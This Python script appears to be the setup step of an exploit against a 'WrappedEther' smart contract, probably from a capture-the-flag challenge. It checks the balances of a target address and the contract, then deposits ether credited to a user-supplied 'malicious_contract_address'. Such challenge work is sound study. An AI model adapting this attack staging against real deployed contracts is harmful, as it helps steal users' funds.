import json
import os
import pprint
import eth_account
import eth_abi
from eth_abi import encode

from utils import create_transaction, get_abi, web3, myaddr, private_key
from sha3 import keccak_256

if not os.path.exists("abi.json"):
    get_abi("kalvoe.sol")

abi = json.load(open("abi.json", encoding="ascii"))
abi_we = abi["kalvoe.sol:WrappedEther"]["abi"]

def create_transaction1(func, val):
    transaction = func.build_transaction(
        {
            "from": myaddr,
            "nonce": web3.eth.get_transaction_count(myaddr),
            "value": val
        }
    )

    # Sign the transaction
    signed_txn = web3.eth.account.sign_transaction(transaction, private_key=private_key)

    # Send the transaction
    txn_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)

    # Wait for the transaction to be mined
    txn_receipt = web3.eth.wait_for_transaction_receipt(txn_hash)

    print(f"Transaction successful with hash: {txn_hash.hex()}")

contract_address = "0xA4B2995F65d12F5a4E559bB6Ab86cECdaca07116"

we_ctr = web3.eth.contract(address=contract_address, abi=abi_we)
pprint.pprint([x for x in dir(we_ctr.functions) if "__" not in x])

target_address  = "0xeBD640f2613bBE71373da25c0C10F433CA3b687a"
balance = we_ctr.functions.balanceOf(target_address).call()
print(balance)
print(web3.eth.get_balance(target_address))
print(web3.eth.get_balance(contract_address))
print(we_ctr.functions.balanceOf(myaddr).call())

#func = we_ctr.functions.deposit(myaddr)
#create_transaction1(func, 10**17)

#func = we_ctr.functions.withdrawAll()
#create_transaction(func)


transfer = 100000000000000
malicious_contract_address = input("addr: ")

if we_ctr.functions.balanceOf(malicious_contract_address).call() != transfer:
    #func = we_ctr.functions.approve(malicious_contract_address, transfer)
    #create_transaction(func)
    func = we_ctr.functions.deposit(malicious_contract_address)
    create_transaction1(func, transfer)

print(we_ctr.functions.balanceOf(malicious_contract_address).call())
input()
